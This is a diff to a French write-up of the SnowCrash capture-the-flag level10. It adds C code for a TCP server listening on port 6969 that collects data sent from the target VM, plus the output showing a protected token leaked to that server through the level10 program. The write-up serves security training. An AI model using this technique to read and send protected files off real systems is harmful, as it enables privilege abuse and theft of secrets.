@@ -10,7 +10,82 @@ level10@SnowCrash:~$ ./level10
 Pour que l'on puisse exploiter ce programme, on va avoir besoin de créer un programme serveur qui va écouter sur le port 6969 de notre VM de travail, et qui va récupérer la data qu'envoie le client depuis la VM SnowCrash.
 
 ```
-code ici
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+#include <unistd.h> /* close */
+#include <netdb.h> /* gethostbyname */
+#include <errno.h>
+#include <stdio.h>
+
+#define INVALID_SOCKET -1
+#define SOCKET_ERROR -1
+#define closesocket(s) close(s)
+#define PORT 6969
+
+typedef int SOCKET;
+typedef struct sockaddr_in SOCKADDR_IN;
+typedef struct sockaddr SOCKADDR;
+typedef struct in_addr IN_ADDR;
+
+int main ()
+{
+        char buff[2048];
+        //Creation du socket
+        SOCKET ssocket = socket(AF_INET, SOCK_STREAM, 0);
+        if (ssocket == INVALID_SOCKET)
+        {
+                perror("socket()");
+                exit(errno);
+        }
+
+        //Creation de l'interface d'ecoute du socket
+        SOCKADDR_IN sin = { 0 };
+
+        sin.sin_addr.s_addr = htonl(INADDR_ANY);
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(PORT);
+
+        if (bind(ssocket, (SOCKADDR *)&sin, sizeof(sin)) == SOCKET_ERROR)
+        {
+                perror("bind()");
+                exit(errno);
+        }
+
+        //Linitation du nombre de connections
+        if (listen(ssocket, 5) == SOCKET_ERROR)
+        {
+                perror("listen()");
+                exit(errno);
+        }
+
+
+        SOCKET client_socket;
+        while(1)
+        {
+                SOCKADDR_IN client_sin = { 0 };
+                socklen_t clientLength = sizeof(client_sin);
+                client_socket = accept(ssocket, (SOCKADDR *)&client_sin, &clientLength);
+                if (client_socket == INVALID_SOCKET)
+                {
+                        perror("accept()");
+                        exit(errno);
+                }
+
+                //Reception des datas
+                int n = 0;
+                bzero((void*)buff, sizeof(buff));
+                while ((n = recv(client_socket, buff, sizeof(buff) - 2, 0) > 0))
+                {
+                        printf("%s\0\n", buff);
+                        bzero((void*)buff, sizeof(buff));
+                }
+        }
+        closesocket(ssocket);
+        closesocket(client_socket);
+}
 ```
 
 On essaie d'envoyer un fichier simple avec `level10`, on reçoit bien son contenu sur notre serveur.
@@ -64,7 +139,13 @@ done
 On lance notre serveur, et on exécute les deux scripts. Au bout de quelques secondes, on reçoit le contenu de `token` sur notre serveur.
 
 ```
-retour ici
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+...
 ```
 
 On se connecte sur le compte flag10 et on obtient notre token:
